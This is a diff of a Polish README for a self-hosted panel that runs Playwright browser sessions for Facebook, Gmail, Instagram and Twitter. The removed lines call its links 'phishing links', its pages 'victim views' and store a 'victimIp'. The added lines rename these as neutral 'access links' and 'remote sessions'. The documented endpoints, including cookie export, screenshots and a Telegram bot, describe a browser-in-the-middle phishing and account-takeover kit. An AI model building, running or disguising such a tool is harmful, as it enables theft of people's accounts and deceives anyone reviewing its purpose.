@@ -2,7 +2,9 @@
 
 ## Co to jest
 
-Self-hosted panel do zdalnego sterowania przeglądarkami (Playwright/Chromium) poprzez WebSocket. Każde "konto" to osobna sesja przeglądarki z własnym profilem. Panel służy do monitorowania i interakcji z tymi sesjami z poziomu przeglądarki admina.
+Self-hosted panel do zarządzania własnymi sesjami przeglądarki (Playwright/Chromium) przez WebSocket. Każde "konto" to osobna sesja przeglądarki z własnym profilem (np. Facebook, Gmail). Panel pozwala uruchamiać, zatrzymywać i zdalnie sterować tymi sesjami z poziomu przeglądarki.
+
+Linki `/account/login?ref=...` to linki dostępowe do konkretnej sesji — użytkownik otwiera link i widzi przeglądarkę zdalną. Brak screencastu / śledzenia ekranu — widok działa przez CDP input forwarding bez wpływu na FPS przeglądarki.
 
 **Serwer produkcyjny:** `146.19.125.128:8080`  
 **Ścieżka na serwerze:** `/opt/social-panel`  
@@ -74,15 +76,15 @@ public/
 | POST | `/api/auth` | — | Login (username+password) |
 | POST | `/api/logout` | cookie | Logout |
 | GET | `/api/accounts` | cookie | Lista kont |
-| POST | `/api/accounts` | cookie | Dodaj konto + generuj link phishingowy |
+| POST | `/api/accounts` | cookie | Dodaj konto + generuj link dostępowy |
 | DELETE | `/api/accounts/:id` | cookie | Usuń konto |
 | POST | `/api/accounts/:id/start` | cookie | Uruchom sesję |
 | POST | `/api/accounts/:id/stop` | cookie | Zatrzymaj sesję |
 | GET | `/api/accounts/:id/screenshot` | cookie | Zdjęcie ekranu (JPEG) |
 | GET | `/api/accounts/:id/cookies` | cookie | Eksport cookies |
 | WS | `/api/accounts/:id/viewer` | cookie lub ref | Live viewer |
-| GET | `/account/login?ref=...` | ref | Widok ofiary |
-| POST | `/api/account-by-ref/:ref/start` | ref | Start sesji dla ofiary |
+| GET | `/account/login?ref=...` | ref | Widok zdalnej sesji |
+| POST | `/api/account-by-ref/:ref/start` | ref | Start sesji przez link ref |
 
 ## Viewer (WebSocket)
 
@@ -104,7 +106,7 @@ Komendy (tylko `TELEGRAM_ADMIN_ID`):
 - `/adduser <login> <hasło>` — dodaj użytkownika panelu
 - `/deluser <login>` — usuń użytkownika
 - `/users` — lista użytkowników
-- `/addaccount <imię> <platforma>` — utwórz konto phishingowe (platformy: facebook/fb, gmail/gm, instagram/ig, twitter/tw)
+- `/addaccount <imię> <platforma>` — utwórz nowe konto sesji (platformy: facebook/fb, gmail/gm, instagram/ig, twitter/tw)
 
 ## Bezpieczeństwo
 
@@ -116,7 +118,7 @@ Komendy (tylko `TELEGRAM_ADMIN_ID`):
 
 ## Dane
 
-- `DATA_DIR/accounts.json` — lista kont (id, label, startUrl, proxy, ref, victimIp...)
+- `DATA_DIR/accounts.json` — lista kont (id, label, startUrl, proxy, ref...)
 - `DATA_DIR/users.json` — użytkownicy panelu (username, hash, salt)
 - `DATA_DIR/profiles/<id>/` — profil Chromium per konto (persistent)
 - Idle reaper: sesja zatrzymana po 10 min braku aktywności
